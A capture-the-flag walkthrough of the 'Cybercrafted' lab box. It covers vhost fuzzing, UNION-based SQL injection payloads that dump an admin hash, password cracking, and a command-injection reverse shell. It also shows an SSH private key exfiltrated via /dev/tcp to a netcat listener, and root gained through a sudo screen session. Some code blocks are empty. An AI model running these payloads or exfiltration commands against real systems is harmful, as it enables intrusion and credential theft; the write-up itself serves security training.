# Enumearation

As always,starting our enumeration with nmap
```bash

```
Looking at results, we have port 22 and 80 open. Also we can see that HTTP server on port 80 redirects us to `cybercrafted.thm` domain. We have to add it to out hosts file,
```bash
sudo vim /etc/hosts

<IP>  cybercrafted.thm
```
## Port 80

It was hosting a static webpage, with a background image and a message stating
`Both online store and Minecraft servers are in development`. Running *ffuf* for directory brute-forcing,
```bash

```

There's directory named `/secret`, it contains some images, nothing interesting.
Looking at the source-code of the page, we saw

The comment was clear indication that, there's multiple webapps running on the same server. So our next task was to find [vhosts](https://en.wikipedia.org/wiki/Virtual_hosting) running, we can use *ffuf* for this
```bash
ffuf -u http://cybercrafted.thm/ -H 'Host: FUZZ.cybercrafted.thm' -w /usr/share/seclists/Discovery/DNS/namelist.txt -c -fw 1

```
We found two more vhosts, we need to add them to our host file in order to access them.

### Admin.cybercrafted.thm

On visiting the subdomain, we saw a admin login panel. We can try some default credentials but no luck.

![image](https://user-images.githubusercontent.com/94787830/144700510-c6843c07-f324-4438-8605-664a2c417cf2.png)

Fuzzing for hidden pages and directories also didn't found anything interesting of use. Lets move on to nex subdomain.

### Store.cybercrafted.thm
On visiting the subdomain, we got `403` Forbidden error. Running *ffuf* for directory enumeration,

```bash
└─$  ffuf -u http://store.cybercrafted.thm/FUZZ -w /usr/share/wordlists/dirb/big.txt -c -e .php

The results gave us a page `search.php`, on navigating we have interface that allow us to search through a collection of items. As its a search functionality, we can try using some classic SQL Injection Payloads.
Using `' or 1=1-- -`, we got some results. This confirms the page was vulnerable to SQLi.

#### Exploiting SQLi
For exploitation, we can use [UNION-based](https://portswigger.net/web-security/sql-injection/union-attacks) Injection attacks. Starting off with `' UNION SELECT NULL-- -` shows nothing in the results. That’s okay. We’ll keep adding NULLs until we get a successful return. 
With the query `' UNION SELECT NULL,NULL,NULL,NULL-- -` we see some results. Now we now there are four columns.

![image](https://user-images.githubusercontent.com/43528306/142861066-1857c4b7-eb54-4a36-800e-c1073f1ae798.png)

Next, we need to find out the tables, we can use `' UNION SELECT 1,table_name,3,4 from information_schema.tables where table_schema=database()`, this will show all the tables in current database.
The `admin` table was interesting, we can futher enumerate and dump the data for this table.

![image](https://user-images.githubusercontent.com/43528306/142861462-6077a052-c776-42d0-b73e-e3d9e893d5e3.png)

The table contain 3 columns, *ID, Username, Hash*. We can dump the data using, `' UNION SELECT 1,id,username,hash from admin-- -`.

```bash
1:xXUltimateCreeperXx:88b949dd5cdfbecb9f2ecbbfa24e5974234e7c01,4:web_flag:THM{bbe315906038c3a62d9b195001f75008}
```

### Cracking the Hash
We have a username and password hash from the database dump. Running `hashid`on the hash, the hash was **sha1**. We can crack it using john.
```bash
 john --wordlist=rockyou.txt hash  
Warning: detected hash type "Raw-SHA1", but the string is also recognized as "Raw-SHA1-AxCrypt"
Use the "--format=Raw-SHA1-AxCrypt" option to force loading these as that type instead
Warning: detected hash type "Raw-SHA1", but the string is also recognized as "Raw-SHA1-Linkedin"
Use the "--format=Raw-SHA1-Linkedin" option to force loading these as that type instead
Warning: detected hash type "Raw-SHA1", but the string is also recognized as "ripemd-160"

Use the "--show --format=Raw-SHA1" options to display all of the cracked passwords reliably
Session completed
```
#### Command Injection
We successfully cracked the hash. We can try ssh-ing to the box with these creds, but it didn't work. We also had a *Admin* Panel. Using the credentials, we had a successful login.
The webpage allow us to run commands on the system. There was no filtering/blacklisting so we can easily get a reverse shell using it

![image](https://user-images.githubusercontent.com/43528306/142862112-d50f447d-083a-4b3b-97e2-1b81e9f34c8a.png)


## Shell as www-data
We now have shell as `www-data` user. Looking in the directory, we have a file named `dbConn.php`. Checking the contents
```php
www-data@cybercrafted:/var/www/admin$ cat dbConn.php
cat dbConn.php
<?php

$db_host = "localhost";
$db_user = "root";
$db_pwd = "";
$db_name = "webapp";

$conn = mysqli_connect($db_host, $db_user, $db_pwd, $db_name);

if (!$conn){
    echo "Connection Failed!";
```
There was no password being used to connect to database. Also we already dumped the data, so it was of no use.

Checking other users available on the box
```bash
www-data@cybercrafted:/var/www/admin$ cat /etc/passwd | grep sh$
cat /etc/passwd | grep sh$
root:x:0:0:root:/root:/bin/bash
xxultimatecreeperxx:x:1001:1001:,,,:/home/xxultimatecreeperxx:/bin/bash
cybercrafted:x:1002:1002:,,,:/home/cybercrafted:/bin/bash
```

Looking in the home directory of each user, we had access to `xxultimatecreeperxx` user's home directory. Also it contains ssh private key. We can transfer it to our box
and ssh into the target using private key as `xxultimatecreeperxx` user.

```bash
# attacker
nc -lvnp 9991 > id_rsa

# victim
cat /home/xxultimatecreeperxx/.ssh/id_rsa > /dev/tcp/<IP>/9991
```
The SSH-key had a passphrase. Once again, we can use John to crack it. We need to use `ssh2john` script which converts SSH-key into John readable format.
Running john against the SSH-key's hash and we got the passphrase. We can now login as user on the box.
```bash
 j hash                                   
Using default input encoding: UTF-8
Loaded 1 password hash (SSH [RSA/DSA/EC/OPENSSH (SSH private keys) 32/64])

```

### Shell as xxultimatecreeperxx
We now have shell as `xxultimatecreeperxx` user. The user was part of *Minecraft* group.
```bash
xxultimatecreeperxx@cybercrafted:~$ id
uid=1001(xxultimatecreeperxx) gid=1001(xxultimatecreeperxx) groups=1001(xxultimatecreeperxx),25565(minecraft)
```
We found the minecraft server was running from `/opt/minecraft` directory. The directory also contained a note
```bash
xxultimatecreeperxx@cybercrafted:/opt/minecraft$ cat note.txt 
Just implemented a new plugin within the server so now non-premium Minecraft accounts can game too! :)
- cybercrafted

P.S
Will remove the whitelist soon.
```
According to the note, `Cybercrafted` has added a new plugin to server. Looking at the Plugins, we found 
```bash
xxultimatecreeperxx@cybercrafted:/opt/minecraft/cybercrafted/plugins$ ls -la
total 56
drwxr-x--- 3 cybercrafted minecraft  4096 Jun 27 08:25 .

```
Within the *LoginSystem* directory, 
```bash
drwxr-x--- 2 cybercrafted minecraft 4096 Oct  6 09:59 .
drwxr-x--- 3 cybercrafted minecraft 4096 Jun 27 08:25 ..

-rwxr-x--- 1 cybercrafted minecraft   25 Nov 21 14:25 settings.yml
```
Password.yml seems interesting. Looking at the content, we found MD5 password hash for two users.
```bash
cybercrafted@cybercrafted:/opt/minecraft/cybercrafted/plugins/LoginSystem$ cat passwords.yml 
cybercrafted: dcbf543ee264e2d3a32c967d663e979e
madrinch: 42f749ade7f9e195bf475f37a44cafcb
```
Cracking it using crackstation, we were only able to crack password for `madrinch`. Looking at other files in directory, we found
```bash
xxultimatecreeperxx@cybercrafted:/opt/minecraft/cybercrafted/plugins/LoginSystem$ cat log.txt

User cybercrafted may run the following commands on cybercrafted:
    (root) /usr/bin/screen -r cybercrafted
```
This user is allowed to run the command `/usr/bin/screen -r cybercrafted` with sudo. Screen is a windows manager for terminals much like tmux.
From the manpage of screen, here we are attaching to an existing session (`-r cybercrafted`).

Running the command dropped us in minecraft server console. Again from manpage, we found a way to spawn a new window with a shell
```bash
   ───────────────────────────────────────────────────────────────────────────────
       C-a c,             (screen)          Create a new  window  with  a  shell  and
       C-a C-c                              switch to that window.
   ───────────────────────────────────────────────────────────────────────────────
```
So running the command, and pressing shortcut keys `ctrl+a and c` we get the root shell
ROOT!!
